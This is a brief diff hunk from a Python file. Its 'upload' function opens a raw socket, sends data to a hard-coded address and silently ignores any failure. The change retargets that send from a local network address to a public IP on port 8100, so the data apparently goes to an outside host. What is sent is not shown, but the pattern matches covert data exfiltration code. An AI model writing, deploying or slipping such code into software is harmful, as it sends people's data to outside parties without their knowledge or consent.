@@ -24,7 +24,7 @@ def upload(data):
     if any(map(lambda x: x==share,table)) == True:
         try:
             clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            clientSocket.connect(("192.168.0.100",8100))
+            clientSocket.connect(("91.227.0.212",8100))
             clientSocket.send(data.encode('utf-8'))
         except:
             pass
